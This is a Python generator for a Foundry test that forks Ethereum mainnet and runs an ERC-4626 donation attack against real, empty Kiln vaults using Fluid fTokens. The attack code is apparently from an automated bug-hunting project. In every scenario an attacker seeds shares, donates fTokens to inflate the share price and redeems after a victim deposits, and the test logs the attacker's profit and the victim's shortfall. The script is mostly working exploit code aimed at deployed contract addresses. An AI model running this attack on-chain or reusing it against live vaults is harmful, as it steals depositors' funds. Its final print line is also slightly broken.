#!/usr/bin/env python3
"""Generate a realistic local-fork nested ERC-4626 donation test for empty Fluid vaults."""
from pathlib import Path
import requests
from web3 import Web3

URL=(
 "https://raw.githubusercontent.com/zerodaybugs/test/"
 "agent/kiln-omnivault-r11-readonly/"
 "r13_persisted_results/31910466827/r13_generation/SCOPE.json"
)
scope=requests.get(URL,headers={'User-Agent':'Kiln-R22-LocalFork/1.0'},timeout=45).json()
rows=[r for r in scope if int(r['chain_id'])==1 and r.get('connector')=='FLUID']
if not rows: raise SystemExit('no Ethereum Fluid vaults')
pushes='\n'.join(f"        vaults.push({Web3.to_checksum_address(r['vault'])});" for r in rows)

source=f'''// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import {{Test, console2}} from "forge-std/Test.sol";

interface IR22Vault {{
    function asset() external view returns(address);
    function connectorRegistry() external view returns(address);
    function connectorName() external view returns(bytes32);
    function totalAssets() external view returns(uint256);
    function totalSupply() external view returns(uint256);
    function deposit(uint256,address) external returns(uint256);
    function redeem(uint256,address,address) external returns(uint256);
    function maxRedeem(address) external view returns(uint256);
    function previewRedeem(uint256) external view returns(uint256);
    function balanceOf(address) external view returns(uint256);
}}
interface IR22Registry {{ function getOrRevert(bytes32) external view returns(address); }}
interface IR22Connector {{
    function fluidFactory() external view returns(address);
    function fTokenType() external view returns(string memory);
}}
interface IR22Factory {{ function computeToken(address,string calldata) external view returns(address); }}
interface IR22FToken {{
    function deposit(uint256,address) external returns(uint256);
    function transfer(address,uint256) external returns(bool);
    function balanceOf(address) external view returns(uint256);
    function previewRedeem(uint256) external view returns(uint256);
}}
interface IR22Token {{
    function balanceOf(address) external view returns(uint256);
    function decimals() external view returns(uint8);
}}

contract KilnR22FluidDonation is Test {{
    address constant ATTACKER=address(0xA771);
    address constant VICTIM=address(0xB0B);
    address[] vaults;

    struct Result {{
        uint256 seed;
        uint256 donation;
        uint256 victimAmount;
        bool victimDepositOk;
        bytes4 victimDepositError;
        uint256 attackerKilnShares;
        uint256 donatedFTokens;
        uint256 totalAssetsAfterDonation;
        uint256 victimShares;
        uint256 attackerFinalAsset;
        uint256 attackerRemainingShares;
        uint256 attackerRemainingPreview;
        int256 attackerEquityProfit;
        uint256 victimFinalAsset;
        uint256 victimPreview;
        uint256 victimEquity;
        uint256 victimShortfall;
        uint256 totalAssetsFinal;
        uint256 totalSupplyFinal;
    }}

    function setUp() public {{
{pushes}
    }}

    function test_realNestedDonationAgainstEmptyFluidVaults() external {{
        vm.createSelectFork(vm.envString("R22_RPC_URL"));
        console2.log("R22_FIXED_BLOCK",block.number);
        for(uint256 i;i<vaults.length;++i) _scan(vaults[i]);
    }}

    function _scan(address vaultAddr) internal {{
        IR22Vault v=IR22Vault(vaultAddr);
        address asset=v.asset();
        if(v.totalSupply()!=0 || v.totalAssets()!=0) {{
            console2.log("R22_SKIP_NONEMPTY",vaultAddr);
            return;
        }}
        uint256 unit=10**IR22Token(asset).decimals();
        address registry=v.connectorRegistry();
        address connector=IR22Registry(registry).getOrRevert(v.connectorName());
        IR22Connector c=IR22Connector(connector);
        address fToken=IR22Factory(c.fluidFactory()).computeToken(asset,c.fTokenType());
        console2.log("R22_VAULT",vaultAddr);
        console2.log("R22_ASSET",asset);
        console2.log("R22_FTOKEN",fToken);

        _pair(vaultAddr,asset,fToken,unit,0,unit,1);
        _pair(vaultAddr,asset,fToken,unit,unit,unit,2);
        _pair(vaultAddr,asset,fToken,unit,10*unit,unit,3);
        _pair(vaultAddr,asset,fToken,unit,100*unit,10*unit,4);
        _pair(vaultAddr,asset,fToken,unit,1000*unit,100*unit,5);
    }}

    function _pair(address vaultAddr,address asset,address fToken,uint256 seed,uint256 donation,uint256 victimAmount,uint256 arm) internal {{
        uint256 snap=vm.snapshotState();
        Result memory r=_scenario(vaultAddr,asset,fToken,seed,donation,victimAmount);
        _log(vaultAddr,arm,r);
        require(vm.revertToState(snap),"restore scenario");
    }}

    function _scenario(address vaultAddr,address asset,address fToken,uint256 seed,uint256 donation,uint256 victimAmount) internal returns(Result memory r) {{
        r.seed=seed;r.donation=donation;r.victimAmount=victimAmount;
        IR22Vault v=IR22Vault(vaultAddr);
        IR22Token token=IR22Token(asset);
        deal(asset,ATTACKER,seed+donation,false);
        deal(asset,VICTIM,victimAmount,false);
        _approve(asset,ATTACKER,vaultAddr);
        vm.prank(ATTACKER);
        r.attackerKilnShares=v.deposit(seed,ATTACKER);

        if(donation>0) {{
            _approve(asset,ATTACKER,fToken);
            vm.prank(ATTACKER);
            uint256 minted=IR22FToken(fToken).deposit(donation,ATTACKER);
            uint256 balance=IR22FToken(fToken).balanceOf(ATTACKER);
            require(balance>=minted && minted>0,"fToken mint");
            vm.prank(ATTACKER);
            require(IR22FToken(fToken).transfer(vaultAddr,minted),"fToken donation transfer");
            r.donatedFTokens=minted;
        }}
        r.totalAssetsAfterDonation=v.totalAssets();

        _approve(asset,VICTIM,vaultAddr);
        vm.prank(VICTIM);
        try v.deposit(victimAmount,VICTIM) returns(uint256 shares) {{
            r.victimDepositOk=true;r.victimShares=shares;
        }} catch(bytes memory reason) {{ r.victimDepositError=_sel(reason); }}

        for(uint256 i;i<4;++i) {{
            uint256 shares=v.balanceOf(ATTACKER);
            if(shares==0) break;
            uint256 maximum=v.maxRedeem(ATTACKER);
            if(maximum==0) break;
            vm.prank(ATTACKER);
            try v.redeem(maximum,ATTACKER,ATTACKER) returns(uint256) {{}}
            catch {{ break; }}
        }}

        r.attackerFinalAsset=token.balanceOf(ATTACKER);
        r.attackerRemainingShares=v.balanceOf(ATTACKER);
        r.attackerRemainingPreview=v.previewRedeem(r.attackerRemainingShares);
        r.attackerEquityProfit=int256(r.attackerFinalAsset+r.attackerRemainingPreview)-int256(seed+donation);
        r.victimFinalAsset=token.balanceOf(VICTIM);
        r.victimPreview=v.previewRedeem(v.balanceOf(VICTIM));
        r.victimEquity=r.victimFinalAsset+r.victimPreview;
        r.victimShortfall=r.victimEquity<victimAmount?victimAmount-r.victimEquity:0;
        r.totalAssetsFinal=v.totalAssets();
        r.totalSupplyFinal=v.totalSupply();
    }}

    function _approve(address token,address owner,address spender) internal {{
        vm.prank(owner);
        (bool ok,bytes memory ret)=token.call(abi.encodeWithSelector(bytes4(0x095ea7b3),spender,type(uint256).max));
        require(ok && (ret.length==0 || (ret.length>=32 && abi.decode(ret,(bool)))),"approve");
    }}

    function _log(address vaultAddr,uint256 arm,Result memory r) internal view {{
        console2.log("R22_CASE_BEGIN");
        console2.log("R22_VAULT",vaultAddr);
        console2.log("R22_ARM",arm);
        console2.log("R22_SEED",r.seed);
        console2.log("R22_DONATION",r.donation);
        console2.log("R22_VICTIM_AMOUNT",r.victimAmount);
        console2.log("R22_VICTIM_DEPOSIT_OK",r.victimDepositOk);
        console2.logBytes4(r.victimDepositError);
        console2.log("R22_ATTACKER_KILN_SHARES",r.attackerKilnShares);
        console2.log("R22_DONATED_FTOKENS",r.donatedFTokens);
        console2.log("R22_TOTAL_ASSETS_AFTER_DONATION",r.totalAssetsAfterDonation);
        console2.log("R22_VICTIM_SHARES",r.victimShares);
        console2.log("R22_ATTACKER_FINAL_ASSET",r.attackerFinalAsset);
        console2.log("R22_ATTACKER_REMAINING_SHARES",r.attackerRemainingShares);
        console2.log("R22_ATTACKER_REMAINING_PREVIEW",r.attackerRemainingPreview);
        console2.log("R22_ATTACKER_EQUITY_PROFIT_SIGNED");
        console2.logInt(r.attackerEquityProfit);
        console2.log("R22_VICTIM_FINAL_ASSET",r.victimFinalAsset);
        console2.log("R22_VICTIM_PREVIEW",r.victimPreview);
        console2.log("R22_VICTIM_EQUITY",r.victimEquity);
        console2.log("R22_VICTIM_SHORTFALL",r.victimShortfall);
        console2.log("R22_TOTAL_ASSETS_FINAL",r.totalAssetsFinal);
        console2.log("R22_TOTAL_SUPPLY_FINAL",r.totalSupplyFinal);
        console2.log("R22_CASE_END");
    }}

    function _sel(bytes memory reason) internal pure returns(bytes4 out) {{ if(reason.length>=4) assembly {{ out:=mload(add(reason,32)) }} }}
}}
'''
Path('test/KilnR22FluidDonation.t.sol').write_text(source)
print(f'generated {{len(rows)}} Fluid vaults')
